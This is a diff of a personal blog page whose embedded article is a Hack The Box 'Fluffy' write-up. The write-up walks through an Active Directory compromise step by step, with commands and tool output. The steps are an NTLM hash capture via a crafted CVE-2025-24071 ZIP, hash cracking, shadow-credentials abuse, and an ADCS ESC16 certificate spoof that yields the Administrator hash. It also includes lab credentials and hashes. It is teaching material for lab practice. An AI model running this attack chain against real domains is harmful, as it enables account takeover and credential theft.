@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>HTB - Fluffy | Harun Mansor</title>
 <meta name="keywords" content="">
 <meta name="description" content="Fluffy is an easy rated Windows machine that showcases real-life bad practices that lead to lateral movement, exploiting ADCS misconfigurations up until compromising the DC.
@@ -25,16 +25,16 @@ Below is the list of open ports on the machine.
 Windows_server_2019
 SMB signing scan just for practice purpose :)">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/blog/posts/htb-fluffy/">
+<link rel="canonical" href="https://harunmansor.github.io/blog/posts/htb-fluffy/">
 <link crossorigin="anonymous" href="/blog/assets/css/stylesheet.e1f5c4cae44599655f7ff95195ff89c8cb3adbda94f2b1581a434ab2b4d4e6cf.css" integrity="sha256-4fXEyuRFmWVff/lRlf&#43;JyMs629qU8rFYGkNKsrTU5s8=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/blog/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/blog/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/blog/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/blog/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/blog/safari-pinned-tab.svg">
+<link rel="icon" href="https://harunmansor.github.io/blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://harunmansor.github.io/blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://harunmansor.github.io/blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://harunmansor.github.io/blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://harunmansor.github.io/blog/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/blog/posts/htb-fluffy/">
+<link rel="alternate" hreflang="en" href="https://harunmansor.github.io/blog/posts/htb-fluffy/">
 <noscript>
     <style>
         #theme-toggle,
@@ -71,7 +71,87 @@ SMB signing scan just for practice purpose :)">
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:url" content="https://harunmansor.github.io/blog/posts/htb-fluffy/">
+  <meta property="og:site_name" content="Harun Mansor">
+  <meta property="og:title" content="HTB - Fluffy">
+  <meta property="og:description" content="Fluffy is an easy rated Windows machine that showcases real-life bad practices that lead to lateral movement, exploiting ADCS misconfigurations up until compromising the DC.
+1. Reconnaissance Below is the list of open ports on the machine.
+53 - dns 88 - kerberos 139 - netbios 389 - LDAP 445 - SMB 464 - kpasswd5? 593 - RPC over HTTP 1.0 636 - ssl/LDAP 3268 - LDAP 3269 - ssl/LDAP 5985 - HTTP Windows_server_2019 SMB signing scan just for practice purpose :)">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-09-16T19:15:43+08:00">
+    <meta property="article:modified_time" content="2025-09-16T19:15:43+08:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB - Fluffy">
+<meta name="twitter:description" content="Fluffy is an easy rated Windows machine that showcases real-life bad practices that lead to lateral movement, exploiting ADCS misconfigurations up until compromising the DC.
+1. Reconnaissance
+Below is the list of open ports on the machine.
+53 - dns
+88 - kerberos
+139 - netbios
+389 - LDAP 
+445 - SMB
+464 - kpasswd5?
+593 - RPC over HTTP 1.0
+636 - ssl/LDAP
+3268 - LDAP
+3269 - ssl/LDAP 
+5985 - HTTP
+
+Windows_server_2019
+SMB signing scan just for practice purpose :)">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://harunmansor.github.io/blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HTB - Fluffy",
+      "item": "https://harunmansor.github.io/blog/posts/htb-fluffy/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB - Fluffy",
+  "name": "HTB - Fluffy",
+  "description": "Fluffy is an easy rated Windows machine that showcases real-life bad practices that lead to lateral movement, exploiting ADCS misconfigurations up until compromising the DC.\n1. Reconnaissance Below is the list of open ports on the machine.\n53 - dns 88 - kerberos 139 - netbios 389 - LDAP 445 - SMB 464 - kpasswd5? 593 - RPC over HTTP 1.0 636 - ssl/LDAP 3268 - LDAP 3269 - ssl/LDAP 5985 - HTTP Windows_server_2019 SMB signing scan just for practice purpose :)\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "Fluffy is an easy rated Windows machine that showcases real-life bad practices that lead to lateral movement, exploiting ADCS misconfigurations up until compromising the DC.\n1. Reconnaissance Below is the list of open ports on the machine.\n53 - dns 88 - kerberos 139 - netbios 389 - LDAP 445 - SMB 464 - kpasswd5? 593 - RPC over HTTP 1.0 636 - ssl/LDAP 3268 - LDAP 3269 - ssl/LDAP 5985 - HTTP Windows_server_2019 SMB signing scan just for practice purpose :)\nHost script results: | smb2-time: | date: 2025-06-13T10:39:30 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 6h38m07s, deviation: 0s, median: 6h38m07s 1.2 File discovery in file share (SMB) Upgrade_Notice.pdf Everything-1.4.1.1026.x64 directory everything.exe Everything.lng KeePass directory many files… Upgrade_Notice.pdf would be of use for us later.\n1.3 Bloodhound setup Use the given credentials to populate the Bloodhound interface.\nsudo bloodhound-python -u j.fleischman -p 'J0elTHEM4n1990!' -d fluffy.htb -ns 10.10.11.69 -c all INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3) INFO: Found AD domain: fluffy.htb INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.fluffy.htb:88)] [Errno -2] Name or service not known INFO: Connecting to LDAP server: dc01.fluffy.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc01.fluffy.htb INFO: Found 10 users INFO: Found 54 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: DC01.fluffy.htb INFO: Done in 00M 13S Start neo4j and upload all the data from the previous command output to Bloodhound GUI\nsudo neo4j console After running Bloodhound, right click on the compromised user (j.fleischman) and click “Add to Owned”.\n2. Lateral Movement In the Upgrade_Notice.pdf, there are several CVEs that are pending to upgrade which one vulnerability stands out :- CVE-2025-24071 - Basically it exploits the trust between Windows Explorer and .library-ms file. Windows Explorer automatically parses .library-ms file to build virtual views. When a .library-ms file containing SMB path is compressed into a ZIP archive, and subsequently decompressed by someone in the network, the victim’s hash will be captured as it is a part of the NTLM authentication. This means it will not work if NTLM authentication mechanism is not used in the environment.\nThe exploit : https://www.exploit-db.com/exploits/52310 This exploit will generate a specially crafted ZIP file meant to be decompressed by victim.\n┌──(cresp0㉿kali)-[~/Downloads] └─$ python3 52310.py -i 10.10.14.81 -n paylod_fluffy -o ./output_fluffy --keep [*] Generating malicious .library-ms file... [+] Created ZIP: output_fluffy/paylod_fluffy.zip [!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server. Setup responder and upload the ZIP file to the SMB server\nsmb: \\\u003e put paylod_fluffy.zip putting file paylod_fluffy.zip as \\paylod_fluffy.zip (2.5 kb/s) (average 2.5 kb/s) smb: \\\u003e ls . D 0 Sun Jun 22 00:55:02 2025 .. D 0 Sun Jun 22 00:55:02 2025 Everything-1.4.1.1026.x64 D 0 Fri Apr 18 16:08:44 2025 Everything-1.4.1.1026.x64.zip A 1827464 Fri Apr 18 16:04:05 2025 KeePass-2.58 D 0 Fri Apr 18 16:08:38 2025 KeePass-2.58.zip A 3225346 Fri Apr 18 16:03:17 2025 paylod_fluffy.zip A 334 Sun Jun 22 00:55:02 2025 Upgrade_Notice.pdf A 169963 Sat May 17 15:31:07 2025 5842943 blocks of size 4096. 2253114 blocks available smb: \\\u003e Responder activated and successfully captured hash :\nsudo responder -I tun0 -wvF [+] Listening for events... [SMB] NTLMv2-SSP Client : 10.10.11.69 [SMB] NTLMv2-SSP Username : FLUFFY\\p.agila [SMB] NTLMv2-SSP Hash : p.agila::FLUFFY:d6ac7023016da127:669DD697220ABD56148B54E9315FFD51:0101000000000000006FA0AFD5E2DB01ABF46FB9B154CC660000000002000800470048005200560001001E00570049004E002D004600490050004B005A0049004E0052004F005700340004003400570049004E002D004600490050004B005A0049004E0052004F00570034002E0047004800520056002E004C004F00430041004C000300140047004800520056002E004C004F00430041004C000500140047004800520056002E004C004F00430041004C0007000800006FA0AFD5E2DB010600040002000000080030003000000000000000010000000020000006FBC23B1452E8355F3AB8E58313B291D4334F0AE503E096F6C624A214C100820A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380031000000000000000000 We have caught p.agila hash as she is the victim of the vulnerability. Put the hash in a file and attempt to crack it using hashcat.\nhashcat -m 5600 -a 0 p.agilahash.txt /usr/share/wordlists/rockyou.txt New creds would be obtained p.agila:prometheusx-303. As we have acquired a new user, re-run the below command for the new user in order for Bloodhound to be updated. Upload the command outputs to the Bloodhound web interface.\nbloodhound-python -u p.agila -p \"prometheusx-303\" -d fluffy.htb -ns 10.10.11.69 -c all As we can see in the imgae below, p.agila is a member of the Service Account Managers security group. This should be kept in mind. Click outbound object control. We would see that p.agila is a member of Service Account Managers group that has GenericAll perm on the Service Accounts group which has the GenericWrite perm on its members (ca_svc, ldap_svc and winrm_svc). For the GenericAll, it means Service Account Managers group members can add any users (modify group membership) into group Service Accounts.\n💡 Tip: GenericAll over a group - Full control of a group allows you to directly modify group membership of the group. For full abuse info in that scenario, see the Abuse Info section under the AddMembers edge.\n💡 Tip: GenericWrite over a user - you can write to the “msds-KeyCredentialLink” attribute. Writing to this property allows an attacker to create “ShadowCredentials” on the object and authenticate as the principal using Kerberos PKINIT. See more information under the AddKeyCredentialLink edge. Alternatively, you can write to the “servicePrincipalNames” attribute and perform a targeted kerberoasting attack.\n2.1 Adding ourselves to Service Accounts group So right now, we (p.agila) needs to compromise the critical user accounts in the Service Accounts group to explore further more. Since p.agila is a member of Service Account Managers group which has GenericAll perm to the Service Accounts group, we can add ourselves to the group to inherit the GenericWrite perm on the service accounts. Use bloodyAD tool.\nbloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila [+] p.agila added to SERVICE ACCOUNTS run bloodhound again after adding p.agila to Service Accounts Group.\nbloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.69 -c all 2.2 Shadow Credentials attack to retrieve winrm_svc hash Now we will create shadow credentials on one of the service accounts which is winrm_svc. Use pywhisker.py from here. To understand more about Shadow Credentials attack.. read it here. By doing this attack, we essentially inject a certificate into the account for purposes like persistence, and now we can perform Kerberos PKINIT auth using the cert set by us without knowing its password.\nPlease be noted that we can just use certipy to do the attack in a single command but for learning purposes, I’ll be using 3 tools that complement each other that serve the same purpose as certipy.\nNow, use pywhisker.py to add shadow credentials (modifying msds-KeyCredentialLink attribute) and retrieve the certificate.\n──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/pywhisker/pywhisker] └─$ python3 pywhisker.py -d fluffy.htb -u \"p.agila\" -p \"prometheusx-303\" --dc-ip 10.10.11.69 --target \"WINRM_SVC\" --action \"list\" [*] Searching for the target account [*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb [*] Listing devices for WINRM_SVC [*] DeviceID: b663af76-788c-8644-cbdd-dfbac495f206 | Creation Time (UTC): 2025-06-22 14:14:53.875462 [*] DeviceID: ac543b34-cf8d-f453-f4ae-e8f7a057783e | Creation Time (UTC): 2025-06-22 10:23:29.426920 [*] DeviceID: ca333e54-1aa1-8cb0-a104-702443c6f555 | Creation Time (UTC): 2025-06-22 19:05:51.584066 ┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/pywhisker/pywhisker] └─$ python3 pywhisker.py -d fluffy.htb -u \"p.agila\" -p \"prometheusx-303\" --dc-ip 10.10.11.69 --target \"WINRM_SVC\" --action \"add\" [*] Searching for the target account [*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 59a9d7f7-4924-035f-62f1-d2ce1f138a6f [*] Updating the msDS-KeyCredentialLink attribute of WINRM_SVC [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u003e PFX with cryptography: Xyys4u8v.pfx [+] PFX exportiert nach: Xyys4u8v.pfx [i] Passwort für PFX: vJaqhtyr3hMdv3qKYBSK [+] Saved PFX (#PKCS12) certificate \u0026 key at path: Xyys4u8v.pfx [*] Must be used with password: vJaqhtyr3hMdv3qKYBSK [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools What happened in the output is the shadow credential is added. The tool also generated key pair, where the public key is wrote onto the attribute and the private key is in the pfx file/certificate. The pfx file is used to authenticate as the account winrm_svc.\nNow we have the thing needed for authentication. Since the default authentication mechanism in AD is Kerberos, we will use the cert to get the TGT. Run gettgtpkinit.py from https://github.com/dirkjanm/PKINITtools to get the TGT. File saved to winrm_svc.ccache.\n┌──(root㉿kali)-[/home/cresp0/Desktop/fluffy/PKINITtools] └─# python3 gettgtpkinit.py fluffy.htb/winrm_svc -cert-pfx Xyys4u8v.pfx -pfx-pass vJaqhtyr3hMdv3qKYBSK -dc-ip 10.10.11.69 winrm_svc.ccache 2025-06-23 13:13:01,015 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-06-23 13:13:01,043 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2025-06-23 13:13:06,282 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2025-06-23 13:13:06,282 minikerberos INFO 398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d31e INFO:minikerberos:398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d31e 2025-06-23 13:13:06,286 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file Now, I want you to take a look at the output, where there is an AS-REP encryption key. Let’s dive into what exactly that is and where it came from.\nLet’s go back to how Kerberos works :- remember that Kerberos is password/symmetric while Kerberos + PKINIT is certificate/asymmetric.\nThe first step of the mechanism is the user has to authenitcate using his credentials (password etc). whereas in Kerberos PKINIT, the user presents his certificate-privatekey (the one we got from pywhisker.py) to the KDC to confirm his identity. Then in the AS-REP process, there are two things in AS-REP which are TGT and Session Key encrypted by the symmetric key (AS-REP key) generated by the KDC. The key is generated using either two ways which are RSA and DHE. Lastly, the user will decrypt the session key using AS-REP key or the symmetric key.\nRun getnthash.py to retrieve the NT hash of winrm_svc. This tool actually does the TGS-REQ process, which is the first process to request access to a service after we got the TGT from AS-REP process. The image below explains that we (winrm_svc) is essentially request access to ourselves.\n┌──(root㉿kali)-[/home/cresp0/Desktop/fluffy/PKINITtools] └─# python3 getnthash.py -k 398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d31e fluffy.htb/WINRM_SVC Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash 33bd09dcd697600edf6b3a7af4875767 Use evil-winrm to connect to the account remotely and get the user flag.\n┌──(root㉿kali)-[/home/cresp0/Desktop/fluffy/PKINITtools] └─# evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767 *Evil-WinRM* PS C:\\Users\\winrm_svc\\Desktop\u003e ls Directory: C:\\Users\\winrm_svc\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 6/22/2025 9:03 AM 34 user.txt 3 Privilege Escalation 3.1 Shadow Credentials attack to retrieve ca_svc hash We have another potential privilege escalation target: the ca_svc account. Since this account is tied to the Certificate Authority, we could enumerate for Active Directory Certificate Services (ADCS) vulnerabilities using Certipy. To proceed, however, we would need the hash of ca_svc. Given that we hold GenericWrite permissions over the Service Accounts group, we can leverage this to add shadow credentials to ca_svc (similar to what we previously did with winrm_svc) in order to obtain its hash.\nUse pywhisker.py to add the shadow credentials to ca_svc\n┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/pywhisker/pywhisker] └─$ python3 pywhisker.py -d fluffy.htb -u \"p.agila\" -p \"prometheusx-303\" --dc-ip 10.10.11.69 --target \"CA_SVC\" --action \"add\" [*] Searching for the target account [*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 9e64f016-c1dd-66ff-c943-d87c4739d8dc [*] Updating the msDS-KeyCredentialLink attribute of CA_SVC [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u003e PFX with cryptography: Um3a3b8O.pfx [+] PFX exportiert nach: Um3a3b8O.pfx [i] Passwort für PFX: 2VE9C4kLIQE6OzNX4EFw [+] Saved PFX (#PKCS12) certificate \u0026 key at path: Um3a3b8O.pfx [*] Must be used with password: 2VE9C4kLIQE6OzNX4EFw [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools Request TGT using gettgtpkinit.py\n┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/PKINITtools] └─$ python3 gettgtpkinit.py fluffy.htb/ca_svc -cert-pfx Um3a3b8O.pfx -pfx-pass 2VE9C4kLIQE6OzNX4EFw -dc-ip 10.10.11.69 ca_svc.ccache 2025-06-23 23:53:36,555 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-06-23 23:53:36,581 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2025-06-23 23:53:41,946 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2025-06-23 23:53:41,946 minikerberos INFO 828de87fa89d0b2571107eaa41484fa3479ce9ae6233911ff3a1cfe9c40bb4a7 INFO:minikerberos:828de87fa89d0b2571107eaa41484fa3479ce9ae6233911ff3a1cfe9c40bb4a7 2025-06-23 23:53:41,953 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file Set the KRB5CCNAME environment variable and run getnthash.py to retrieve the hash.\n┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/PKINITtools] └─$ export KRB5CCNAME=$(pwd)/ca_svc.ccache ┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/PKINITtools] └─$ python3 getnthash.py -k 828de87fa89d0b2571107eaa41484fa3479ce9ae6233911ff3a1cfe9c40bb4a7 fluffy.htb/ca_svc /home/cresp0/Desktop/fluffy/PKINITtools/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u003c81. import pkg_resources Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash ca0f4f9e9eb8a092addf53bb03fc98c8 3.2 Exploiting ESC16 Upon retrieving the hash, now we can use Certipy to enumerate for ADCS vulnerabilities.\n┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/adcs_enum] └─$ certipy find -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -enabled Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Finding issuance policies [*] Found 14 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP [*] Successfully retrieved CA configuration for 'fluffy-DC01-CA' [*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb' [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Saving text output to '20250624000309_Certipy.txt' [*] Wrote text output to '20250624000309_Certipy.txt' [*] Saving JSON output to '20250624000309_Certipy.json' [*] Wrote JSON output to '20250624000309_Certipy.json' Open the output file. It can be seen that the environment is vulnerable to ESC16.\n┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/adcs_enum] └─$ cat 20250624000309_Certipy.txt Certificate Authorities 0 CA Name : fluffy-DC01-CA DNS Name : DC01.fluffy.htb Certificate Subject : CN=fluffy-DC01-CA, DC=fluffy, DC=htb Certificate Serial Number : 3670C4A715B864BB497F7CD72119B6F5 Certificate Validity Start : 2025-04-17 16:00:16+00:00 Certificate Validity End : 3024-04-17 16:11:16+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Disabled Extensions : 1.3.6.1.4.1.311.25.2 Permissions Owner : FLUFFY.HTB\\Administrators Access Rights ManageCa : FLUFFY.HTB\\Domain Admins FLUFFY.HTB\\Enterprise Admins FLUFFY.HTB\\Administrators ManageCertificates : FLUFFY.HTB\\Domain Admins FLUFFY.HTB\\Enterprise Admins FLUFFY.HTB\\Administrators Enroll : FLUFFY.HTB\\Cert Publishers [!] Vulnerabilities ESC16 : Security Extension is disabled. [*] Remarks ESC16 : Other prerequisites may be required for this to be exploitable. See the wiki for more details. Certificate Templates : [!] Could not find any certificate templates From the output above, we can see that 1.3.6.1.4.1.311.25.2 is in Disabled Extensions. 1.3.6.1.4.1.311.25.2 is the Object Identifier (OID) of the special extension szOID_NTDS_CA_SECURITY_EXT. Okay, let’s go to how CA works when the extension is enabled. So when CA issues a certificate, this extension embeds the SID of the AD account that requested the certificate directly into the certificate. But when the extension is disabled, Windows will fall back to using a weak mapping, like mapping the UPN in the cert to an account. Okay that’s too much talking. The general view is the CA issues a cert to an account while the extension is disabled. So when the user uses the certificate for authentication (certificate-based authentication), the DC will have to check if the cert is the user’s belonging, so the DC will blindly just check the identifiers inside the cert (like the UPN in the Subject Alternative Name, or sometimes the CN/email). If the SID extension is missing (which it is missing).. the DC can’t strongly tie the cert back to the exact AD account — it only trusts whatever strings are in the cert, which is where the ESC16 risk comes in.\nSo let’s exploit this. We wanna update the ca_svc UPN to admin so when requesting for a certificate, the generated certificate will have Admin’s UPN embedded in it. Update the ca_svc UPN to administrator.\n┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman] └─$ certipy account -u 'p.agila' -p 'prometheusx-303' -target 'fluffy.htb' -upn 'Administrator@fluffy.htb' -user 'ca_svc' update Certipy v5.0.3 - by Oliver Lyak (ly4k) [!] DNS resolution failed: The DNS query name does not exist: fluffy.htb. [!] Use -debug to print a stacktrace [*] Updating user 'ca_svc': userPrincipalName : Administrator@fluffy.htb [*] Successfully updated 'ca_svc' Next, request a certificate using the account ca_svc and its hash retrieved from shadow credential attack. Remember, only the UPN (ca_svc@fluffy.htb) of ca_svc is changed, not its sAMAccountName (ca_svc), thus the command below uses the “-u ‘ca_svc’”.\nThis command will have an output of the Administrator certificate because the CA embeds the ca_svc’s new UPN to the certificate.\n┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman] └─$ certipy req -dc-ip '10.10.11.69' -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User' Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Request ID is 16 [*] Successfully requested certificate [*] Got certificate with UPN 'Administrator@fluffy.htb' [*] Certificate has no object SID [*] Try using -sid to set the object SID or see the wiki for more details [*] Saving certificate and private key to 'administrator.pfx' [*] Wrote certificate and private key to 'administrator.pfx' Revert back the UPN change.\n┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman] └─$ certipy account -u 'p.agila' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'ca_svc' -upn '' update Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Updating user 'ca_svc': userPrincipalName : *DELETED* [*] Successfully updated 'ca_svc' Perform authentication using the administrator cert, Certipy will get the hash for you.\n┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman] └─$ certipy auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.10.11.69 Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: 'Administrator@fluffy.htb' [*] Using principal: 'administrator@fluffy.htb' [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to 'administrator.ccache' [*] Wrote credential cache to 'administrator.ccache' [*] Trying to retrieve NT hash for 'administrator' [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e Now, you would ask why did i use gettgtpkinit.py and getnthash.py just to get the NT hash after adding shadow credentials. Why don’t i use the command above where i just use certipy auth ? It’s just for understanding the underlying mechanism and to understand how does these things work.\nLastly, use evil-winrm to log in using Admin credentials\n┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman] └─$ evil-winrm -i 10.10.11.69 -u 'Administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e' *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e ls Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 6/23/2025 4:33 PM 34 root.txt Resources CVE-2025-24071 - https://cti.monster/blog/2025/03/18/CVE-2025-24071.html CVE-2025-24071 exploit - https://www.exploit-db.com/exploits/52310 PKINIT exploitation tools - https://github.com/dirkjanm/PKINITtools Pywhisker - https://github.com/ShutdownRepo/pywhisker Shadow Credentials - https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab Shadow Credentials - https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/ ",
+  "wordCount" : "2963",
+  "inLanguage": "en",
+  "datePublished": "2025-09-16T19:15:43+08:00",
+  "dateModified": "2025-09-16T19:15:43+08:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://harunmansor.github.io/blog/posts/htb-fluffy/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Harun Mansor",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://harunmansor.github.io/blog/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -89,7 +169,7 @@ SMB signing scan just for practice purpose :)">
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/blog/" accesskey="h" title="Harun Mansor (Alt + H)">Harun Mansor</a>
+            <a href="https://harunmansor.github.io/blog/" accesskey="h" title="Harun Mansor (Alt + H)">Harun Mansor</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -115,7 +195,7 @@ SMB signing scan just for practice purpose :)">
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/blog/aboutme/" title="About me">
+                <a href="https://harunmansor.github.io/blog/aboutme/" title="About me">
                     <span>About me</span>
                 </a>
             </li>
@@ -126,7 +206,7 @@ SMB signing scan just for practice purpose :)">
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/blog/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/blog/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="https://harunmansor.github.io/blog/">Home</a>&nbsp;»&nbsp;<a href="https://harunmansor.github.io/blog/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
       HTB - Fluffy
     </h1>
@@ -555,7 +635,7 @@ Alternatively, you can write to the “servicePrincipalNames” attribute and pe
 <ul class="share-buttons">
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on x"
-            href="https://x.com/intent/tweet/?text=HTB%20-%20Fluffy&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fhtb-fluffy%2f&amp;hashtags=">
+            href="https://x.com/intent/tweet/?text=HTB%20-%20Fluffy&amp;url=https%3a%2f%2fharunmansor.github.io%2fblog%2fposts%2fhtb-fluffy%2f&amp;hashtags=">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
